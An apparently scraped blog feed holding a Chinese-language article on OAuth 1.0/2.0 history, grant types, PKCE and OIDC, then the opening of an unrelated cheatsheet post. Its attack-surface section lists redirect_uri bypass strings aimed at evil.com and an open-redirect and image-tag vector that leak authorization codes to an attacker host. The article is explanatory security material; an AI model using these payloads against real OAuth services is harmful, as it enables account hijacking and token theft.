&lt;p&gt;但是在2009年，OAuth 1.0被曝出存在严重安全漏洞&lt;a href=&quot;https://oauth.net/advisories/2009-1/&quot;&gt;Session Fixation Attack&lt;/a&gt;，于同年发布修复后版本&lt;a href=&quot;https://oauth.net/core/1.0a/&quot;&gt;OAuth 1.0 Revision A&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;2010年发布&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc6749&quot;&gt;OAuth 2.0&lt;/a&gt;，是OAuth协议的下一版本，但与OAuth 1.0版本互不兼容。&lt;/p&gt;
&lt;p&gt;2013年发布&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc7636&quot;&gt;PKCE(Proof Key for Code Exchange by OAuth Public Clients)&lt;/a&gt;，是OAuth 2.0的一个扩展，用于增强公共客户端的安全性。&lt;/p&gt;
&lt;p&gt;2015年发布&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc8252&quot;&gt;OAuth 2.0 for Native Apps&lt;/a&gt;，是OAuth 2.0的一个扩展，用于增强移动应用的安全性，描述了使用OAuth 2.0的本机和移动应用程序的安全要求和其他建议。包括不允许第三方应用打开嵌入式web视图，以防止钓鱼攻击，以及如何在平台上执行的特定建议。同时还建议使用PKCE扩展进一步保护用户。&lt;/p&gt;
&lt;p&gt;2017年发布&lt;a href=&quot;https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics&quot;&gt;Security Best Current Practice&lt;/a&gt;，是OAuth 2.0的一个扩展，描述了安全要求和其他建议，用于实现OAuth 2.0的客户端和服务器。&lt;/p&gt;
&lt;p&gt;2019年发布&lt;a href=&quot;https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps&quot;&gt;OAuth 2.0 for Browser-Based Apps&lt;/a&gt;，是OAuth 2.0的一个扩展，用于增强浏览器应用的安全性，针对SPA(Single Page Application)建议使用PKCE扩展替代隐式授权流(Implicit flow)。&lt;/p&gt;
&lt;p&gt;2021年发布&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc6749&quot;&gt;OAuth 2.1&lt;/a&gt;，OAuth 2.1总结了后续规范中发布的更改，以简化核心文档。主要区别如下:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PKCE是所有使用授权码流的OAuth客户端的必需项&lt;/li&gt;
&lt;li&gt;重定向URI必须使用精确字符串匹配进行比较&lt;/li&gt;
&lt;li&gt;省略了隐式授权流（response_type = token）的定义&lt;/li&gt;
&lt;li&gt;省略了资源所有者密码凭证授予的定义&lt;/li&gt;
&lt;li&gt;Bearer令牌使用省略了在URI的查询字符串中使用bearer令牌的使用&lt;/li&gt;
&lt;li&gt;对于公共客户端，刷新令牌必须是发送者约束的或一次性使用&lt;/li&gt;
&lt;li&gt;公共和机密客户端的定义已简化为仅指示客户端是否具有凭据&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;1.1. OAuth 1.0漏洞(Session Fixation Attack)分析&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;./801e57d84801b8abf8cde2e8793bf185.png&quot; alt=&quot;801e57d84801b8abf8cde2e8793bf185.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;正常流程为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户访问第三方应用&lt;/li&gt;
&lt;li&gt;用户请求从资源提供者导入资源&lt;/li&gt;
&lt;li&gt;用户携带oauth_token跳转到资源提供者的授权页面&lt;/li&gt;
&lt;li&gt;用户登录到资源提供者系统&lt;/li&gt;
&lt;li&gt;用户授权oauth_token访问资源权限&lt;/li&gt;
&lt;li&gt;用户携带oauth_token跳转到return_url指定的第三方应用&lt;/li&gt;
&lt;li&gt;第三方应用使用oauth_token请求资源&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;./79e8df9b51ab3f86d871bd6002f2dc2c.png&quot; alt=&quot;79e8df9b51ab3f86d871bd6002f2dc2c.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;攻击者可以利用的流程在3、4、5、6步骤&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;攻击者构造包含oauth_token和无效return_url的URL&lt;/li&gt;
&lt;li&gt;让受害者点击链接访问，登录授权后，跳转到无效return_url&lt;/li&gt;
&lt;li&gt;此时受害者授权流程已经中断，攻击者可以利用受害者的oauth_token访问第三方应用完成授权&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;漏洞成因可以总结为，授权码生成方式问题。OAuth1.0中，授权码在请求授权过程中可任意生成，导致授权码可能来自于攻击者。同时授权和令牌获取过程是割裂的，导致攻击者可以优先于受害者获取令牌。&lt;/p&gt;
&lt;h1&gt;2. 什么是OAuth2&lt;/h1&gt;
&lt;p&gt;OAuth 2.0是一个业界标准的授权协议，其定义了四种可以适用于各种应用场景的授权交互模式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;授权码模式(Authorization Code)&lt;/li&gt;
&lt;li&gt;客户端凭证模式(Client Credentials)&lt;/li&gt;
&lt;li&gt;用户凭证模式(Resource Owner Password Credentials)&lt;/li&gt;
&lt;li&gt;隐式授权模式(Implicit)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中，授权码模式被广泛应用于第三方互联网开放平台，通过第三方登录是其最常见应用场景之一，比如使用微信、QQ和淘宝账号进行登录。&lt;/p&gt;
&lt;p&gt;有一些设备存在无浏览器或输入受限情况，所以在&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc8628&quot;&gt;rfc8628 - OAuth 2.0 Device Authorization Grant&lt;/a&gt;引入设备授权(Device code)模式。&lt;/p&gt;
&lt;p&gt;为了解决SPA、原生应用等授权安全性问题，基于授权码模式引入PKCE，形成授权码+PKCE模式(Authorization Code with PKCE)。&lt;/p&gt;
&lt;h2&gt;2.1. 角色&lt;/h2&gt;
&lt;p&gt;OAuth 2.0定义了四种角色：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;资源拥有者（Resource Owner）：资源拥有者是指可以授权第三方应用访问自己资源的用户，比如微信用户。&lt;/li&gt;
&lt;li&gt;资源服务器（Resource Server）：资源服务器是指存储资源的服务器，比如微信服务器。&lt;/li&gt;
&lt;li&gt;客户端（Client）：客户端是指第三方应用，比如京东小程序。&lt;/li&gt;
&lt;li&gt;授权服务器（Authorization Server）：授权服务器是指用于进行授权的服务器，比如微信开放平台。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;2.2. 协议流程&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;+--------+                               +---------------+
|        |--(A)- Authorization Request -&amp;gt;|   Resource    |
|        |                               |     Owner     |
|        |&amp;lt;-(B)-- Authorization Grant ---|               |
|        |                               +---------------+
|        |
|        |                               +---------------+
|        |--(C)-- Authorization Grant --&amp;gt;| Authorization |
| Client |                               |     Server    |
|        |&amp;lt;-(D)----- Access Token -------|               |
|        |                               +---------------+
|        |
|        |                               +---------------+
|        |--(E)----- Access Token ------&amp;gt;|    Resource   |
|        |                               |     Server    |
|        |&amp;lt;-(F)--- Protected Resource ---|               |
+--------+                               +---------------+
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;A. 客户端向资源拥有者发起授权请求，请求授权服务器授予客户端访问资源服务器的权限。&lt;/li&gt;
&lt;li&gt;B. 资源拥有者授权客户端访问资源服务器的权限，授权服务器返回授权码给客户端。&lt;/li&gt;
&lt;li&gt;C. 客户端向授权服务器请求访问令牌。&lt;/li&gt;
&lt;li&gt;D. 授权服务器验证授权码，返回访问令牌给客户端。&lt;/li&gt;
&lt;li&gt;E. 客户端向资源服务器请求资源。&lt;/li&gt;
&lt;li&gt;F. 资源服务器验证访问令牌，返回资源给客户端。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;2.3. 授权模式&lt;/h2&gt;
&lt;p&gt;仅ABCD流程不同，区分为不同模式。&lt;/p&gt;
&lt;h3&gt;2.3.1. 授权码模式(Authorization Code)&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./997ae2800f9c9f31ee64b386c160e018.png&quot; alt=&quot;997ae2800f9c9f31ee64b386c160e018.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这种模式广泛用于第三方应用授权登录，比如使用微信、QQ账号进行登录。&lt;/p&gt;
&lt;h3&gt;2.3.2. 授权码+PKCE模式(Authorization Code with PKCE)&lt;/h3&gt;
&lt;p&gt;在&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc7636&quot;&gt;rfc7636 - Proof Key for Code Exchange by OAuth Public Clients&lt;/a&gt;定义了PKCE，用于解决授权码模式存在的安全性问题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./3a1c8a2c4c9483dd97d676d46f7c373a.png&quot; alt=&quot;3a1c8a2c4c9483dd97d676d46f7c373a.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这种模式广泛用于客户端应用授权登录，比如electron应用、移动应用等。&lt;/p&gt;
&lt;p&gt;其中：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;code_verifier：在 &lt;code&gt;[A-Z] / [a-z] / [0-9] / &quot;-&quot; / &quot;.&quot; / &quot;_&quot; / &quot;~&quot;&lt;/code&gt; 范围内，生成43-128位的随机字符串。&lt;/li&gt;
&lt;li&gt;code_challenge：则是对 code_verifier 通过 code_challenge_method 例如 sha256 转换得来的。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Q: PKCE到底防御哪种攻击？ A: 在SPA、原生应用（如移动应用）、桌面应用（如electron）中，授权过程中有可能会打开外部浏览器，而浏览器可能会被其他应用劫持，导致授权过程被篡改。PKCE是为了防御这种攻击。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;2.3.3. 客户端凭证模式(Client Credentials)&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./0ea51598b4ff50260fb5617c783417a8.png&quot; alt=&quot;0ea51598b4ff50260fb5617c783417a8.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这种模式用于客户端应用存储凭证，自行授权访问资源服务器，比如后端服务使用AK/SK请求操作OSS资源。&lt;/p&gt;
&lt;h3&gt;2.3.4. 用户凭证模式(Resource Owner Password Credentials) 不安全&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./9c140672e8cc8683a074d16fdae83826.png&quot; alt=&quot;9c140672e8cc8683a074d16fdae83826.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;由于凭证会发送给第三方使用，所以这种模式不安全，不推荐使用。&lt;/p&gt;
&lt;h3&gt;2.3.5. 隐式授权模式(Implicit) 不安全&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./25d2de245c3a6040111a64eb1d91f7f8.png&quot; alt=&quot;25d2de245c3a6040111a64eb1d91f7f8.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;一般用于无后端应用，前端存储凭证。&lt;/p&gt;
&lt;p&gt;由于是跳转到三方应用使用GET请求，且服务器直接回传的是授权凭证，在终端容易被读取，如通过资源文件referer，所以这种模式不安全，不推荐使用。&lt;/p&gt;
&lt;p&gt;在某篇博客中曾看到，腾讯存在某个服务使用了隐式授权模式，但是回传Access Token的时候，使用锚点（#），这样锚点之后的数据就不会发送给服务器。但是这种方式也存在安全问题，因为锚点之后的数据是可以被前端获取的，所以这种方式也不安全。&lt;/p&gt;
&lt;h3&gt;2.3.6. 设备代码模式(Device Code) 极大概率存在Session Fixation Attack漏洞&lt;/h3&gt;
&lt;p&gt;在&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc8628&quot;&gt;rfc8628 - OAuth 2.0 Device Authorization Grant&lt;/a&gt;定义了一种新的授权模式，用于设备在无浏览器或输入受限情况下的授权。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;+----------+                                +----------------+
|          |&amp;gt;---(A)-- Client Identifier ---&amp;gt;|                |
|          |                                |                |
|          |&amp;lt;---(B)-- Device Code,      ---&amp;lt;|                |
|          |          User Code,            |                |
|  Device  |          &amp;amp; Verification URI    |                |
|  Client  |                                |                |
|          |  [polling]                     |                |
|          |&amp;gt;---(E)-- Device Code       ---&amp;gt;|                |
|          |          &amp;amp; Client Identifier   |                |
|          |                                |  Authorization |
|          |&amp;lt;---(F)-- Access Token      ---&amp;lt;|     Server     |
+----------+   (&amp;amp; Optional Refresh Token)   |                |
      v                                     |                |
      :                                     |                |
      (C) User Code &amp;amp; Verification URI      |                |
      :                                     |                |
      v                                     |                |
+----------+                                |                |
| End User |                                |                |
|    at    |&amp;lt;---(D)-- End user reviews  ---&amp;gt;|                |
|  Browser |          authorization request |                |
+----------+                                +----------------+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./e8de63708d5258e6d0d07dc059185078.png&quot; alt=&quot;e8de63708d5258e6d0d07dc059185078.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;当Device Client为公共客户端，将退化为OAuth1.0认证方式。&lt;/p&gt;
&lt;h2&gt;2.4. OIDC&lt;/h2&gt;
&lt;p&gt;OpenID Connect 1.0 是 OAuth 2.0 协议的一个简单身份层。它允许客户端基于授权服务器执行的身份验证来验证最终用户的身份，以及以可互操作且类似 REST 的方式获取有关最终用户的基本配置文件信息。&lt;/p&gt;
&lt;p&gt;简单来说：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;授权码模式：使用response_type=code，用授权码换取令牌AccessToken。&lt;/li&gt;
&lt;li&gt;OIDC：使用scope=openid&amp;amp;response_type=code，用授权码换取用于验证身份的JWT。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;3. OAuth2攻击面&lt;/h1&gt;
&lt;h2&gt;3.1. CSRF导致绑定劫持&lt;/h2&gt;
&lt;p&gt;攻击者抓取认证请求构造恶意url，并诱骗已经登录的网用户点击(比如通过邮件或者QQ等方式)，认证成功后用户的帐号会同攻击者的帐号绑定到一起。&lt;/p&gt;
&lt;p&gt;OAuth 2.0提供了state参数用于防御CSRF，认证服务器在接收到的state参数按原样返回给redirect_uri，客户端收到该参数并验证与之前生成的值是否一致，除此方法外也可使用传统的CSRF防御方案。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;案例1: &lt;a href=&quot;http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-054785&quot;&gt;人人网-百度OAuth 2.0 redirect_uir CSRF 漏洞&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;3.2. redirect_uri绕过导致授权劫持&lt;/h2&gt;
&lt;p&gt;根据OAuth的认证流程，用户授权凭证会由服务器转发到redirect_uri对应的地址。&lt;/p&gt;
&lt;p&gt;如果攻击者伪造redirect_uri为自己的地址，然后诱导用户发送该请求，之后获取的凭证就会发送给攻击者伪造的回调地址，攻击者使用该凭证即可登录用户账号，造成授权劫持。&lt;/p&gt;
&lt;p&gt;正常情况下，为了防止该情况出现，认证服务器会验证自己的client_id与回调地址是否对应，常见的方法是验证回调地址的主域。&lt;/p&gt;
&lt;p&gt;以下几种情况验证配置不当，容易导致授权劫持：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;未验证&lt;/p&gt;
&lt;p&gt;未验证的情况，可以直接跳出外域。案例:&lt;a href=&quot;http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2013-045318&quot;&gt;土豆网某处认证缺陷可劫持oauth_token&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;验证绕过&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;auth.app.com.evil.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;evil.com?auth.app.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;evil.com?@auth.app.com&lt;/code&gt; 案例:&lt;a href=&quot;http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-059427&quot;&gt;腾讯OAuth平台 redirect_uri 过滤不严可能导致用户信息遭窃取（二）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;auth.app.com@evil.com&lt;/code&gt; 案例:&lt;a href=&quot;http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2013-045327&quot;&gt;绕过网易oauth认证的redirect_uri限制劫持帐号token&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;auth.app.com@evil.com&lt;/code&gt; 案例:&lt;a href=&quot;http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-059676&quot;&gt;腾讯OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取（四）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;evil.comauth.app.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;evil.com:auth.app.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;evil.com.auth.app.com&lt;/code&gt; 案例:&lt;a href=&quot;http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-059403&quot;&gt;腾讯OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;evil.com:@auth.app.com&lt;/code&gt; 案例:&lt;a href=&quot;http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-059455&quot;&gt;新浪微博OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;宽字符绕过 案例: &lt;a href=&quot;http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-059639&quot;&gt;腾讯OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取（三）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;子域可控&lt;/p&gt;
&lt;p&gt;对回调地址验证了主域为app.com，但其子域evil.app.com可被任意用户注册使用。案例:&lt;a href=&quot;http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-060586&quot;&gt;新浪微博部分App Oauth2漏洞&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;跨域&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;利用可信域跳转盗取授权码。
&lt;ol&gt;
&lt;li&gt;如果网站存在任意跳转，如&lt;code&gt;https://www.example.com/?return_url=&lt;/code&gt;，且未校验跳转后地址。可以构造如下向量&lt;code&gt;https://www.example.com/?return_url=https://www.evil.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;诱骗用户访问该链接&lt;code&gt;https://www.example.com/oauth/authorize?client_id=xxx&amp;amp;redirect_uri=https://www.example.com/?return_url=https://www.evil.com&amp;amp;response_type=code&amp;amp;state=xxx&lt;/code&gt;触发OAuth认证&lt;/li&gt;
&lt;li&gt;用户授权之后，会继续跳转到&lt;code&gt;https://www.evil.com&lt;/code&gt;，攻击者可以从&lt;code&gt;referer&lt;/code&gt;头获取到授权码。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;利用可信域referer盗取授权码。
&lt;ol&gt;
&lt;li&gt;如果跳转后页面可控，比如可以插入自定义图片，或者存在xss漏洞，可以构造向量&lt;code&gt;&amp;lt;img src=&quot;https://www.evil.com&quot;&amp;gt;&lt;/code&gt;，用户授权之后，会向&lt;code&gt;https://www.evil.com&lt;/code&gt;请求资源文件，攻击者可以从&lt;code&gt;referer&lt;/code&gt;头获取到授权码。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;3.3. scope越权访问&lt;/h2&gt;
&lt;p&gt;案例:&lt;a href=&quot;https://coolshell.cn/articles/11021.html&quot;&gt;从“黑掉GITHUB”学WEB安全开发&lt;/a&gt;展示了scope权限控制不当带来的安全风险，同时将授权劫持的几个方面演绎的淋漓尽致。&lt;/p&gt;
&lt;h1&gt;4. 名词解释&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;CAS: Central Authentication Service, 中心认证服务&lt;/li&gt;
&lt;li&gt;AS: Authorization Server, 授权服务器&lt;/li&gt;
&lt;li&gt;RS: Resource Server, 资源服务器&lt;/li&gt;
&lt;li&gt;SPA: Single Page Application, 单页应用&lt;/li&gt;
&lt;li&gt;SSO: Single Sign On, 单点登录&lt;/li&gt;
&lt;li&gt;OIDC: OpenID Connect, 开放身份连接&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;5. 参考资料&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc5849&quot;&gt;rfc5849 - The OAuth 1.0 Protocol&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc6749&quot;&gt;rfc6749 - The OAuth 2.0 Authorization Framework&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc6750&quot;&gt;rfc6750 - The OAuth 2.0 Authorization Framework: Bearer Token Usage&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc6819&quot;&gt;rfc6819 - OAuth 2.0 Threat Model and Security Considerations&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc7009&quot;&gt;rfc7009 - OAuth 2.0 Token Revocation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc7521&quot;&gt;rfc7521 - Assertion Framework for OAuth 2.0 Client Authentication and Authorization Grants&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc7522&quot;&gt;rfc7522 - Security Assertion Markup Language (SAML) 2.0 Profile for OAuth 2.0 Client Authentication and Authorization Grants&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc7523&quot;&gt;rfc7523 - JSON Web Token (JWT) Profile for OAuth 2.0 Client Authentication and Authorization Grants&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc7591&quot;&gt;rfc7591 - OAuth 2.0 Dynamic Client Registration Protocol&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc7592&quot;&gt;rfc7592 - OAuth 2.0 Dynamic Client Registration Management Protocol&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc7636&quot;&gt;rfc7636 - Proof Key for Code Exchange by OAuth Public Clients&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc7662&quot;&gt;rfc7662 - OAuth 2.0 Token Introspection&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc8252&quot;&gt;rfc8252 - OAuth 2.0 for Native Apps&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc8414&quot;&gt;rfc8414 - OAuth 2.0 Authorization Server Metadata&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc8628&quot;&gt;rfc8628 - OAuth 2.0 Device Authorization Grant&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc8693&quot;&gt;rfc8693 - OAuth 2.0 Token Exchange&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc8705&quot;&gt;rfc8705 - OAuth 2.0 Mutual-TLS Client Authentication and Certificate-Bound Access Tokens&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics&quot;&gt;Security Best Current Practice&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps&quot;&gt;OAuth 2.0 for Browser-Based Apps&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://oauth.net/2/&quot;&gt;oauth.net&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/92051359&quot;&gt;白话让你理解什么是oAuth2协议&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/h2zZhou/p/5741262.html&quot;&gt;OAuth 2.0攻击面与案例总结&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.authing.cn/blog/558&quot;&gt;OIDC &amp;amp; OAuth2.0 协议及其授权模式详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.ruanyifeng.com/blog/2019/04/oauth_design.html&quot;&gt;OAuth 2.0 的一个简单解释&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://openid.net/connect/&quot;&gt;OpenID Connect&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded></item><item><title>cheetsheet</title><link>https://picoorg.github.io/posts/cheetsheet/</link><guid isPermaLink="true">https://picoorg.github.io/posts/cheetsheet/</guid><description>CheetSheet，快速检索常见Tips。</description><pubDate>Sat, 11 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-%E4%BB%A3%E7%90%86&quot;&gt;1. 代理&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-ssh&quot;&gt;1.1. ssh&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-android&quot;&gt;2. Android&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#21-adb&quot;&gt;2.1. adb&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#22-fastboot&quot;&gt;2.2. fastboot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#23-%E9%80%86%E5%90%91&quot;&gt;2.3. 逆向&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#24-%E7%B3%BB%E7%BB%9F%E8%AF%81%E4%B9%A6&quot;&gt;2.4 系统证书&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-frida&quot;&gt;3. Frida&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#31-%E5%A0%86%E6%A0%88%E6%89%93%E5%8D%B0&quot;&gt;3.1. 堆栈打印&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4-windows&quot;&gt;4. Windows&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#41-hyper-v&quot;&gt;4.1. hyper-v&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#5-%E8%AF%81%E4%B9%A6&quot;&gt;5. 证书&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#51-openssl&quot;&gt;5.1. openssl&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#6-docker&quot;&gt;6. Docker&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#61-docker-desktop-version-on-mac&quot;&gt;6.1. Docker Desktop version on Mac&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#7-linux&quot;&gt;7. Linux&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#71-%E6%89%A9%E5%AE%B9&quot;&gt;7.1. 扩容&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#72-%E8%87%AA%E5%8A%A8%E6%8C%82%E8%BD%BD&quot;&gt;7.2. 自动挂载&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#73-%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%93%8D%E4%BD%9C&quot;&gt;7.3. 命令行操作&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#8-mysql&quot;&gt;8. Mysql&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#9-nodejs&quot;&gt;9. NodeJS&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#91-elecetron%E5%8F%8D%E7%BC%96%E8%AF%91&quot;&gt;9.1. elecetron反编译&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#10-%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE&quot;&gt;10. 参考文献&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;1. 代理&lt;/h1&gt;
&lt;h2&gt;1.1. ssh&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;socks5走ssh隧道实现代理&lt;/li&gt;
&lt;/ol&gt;
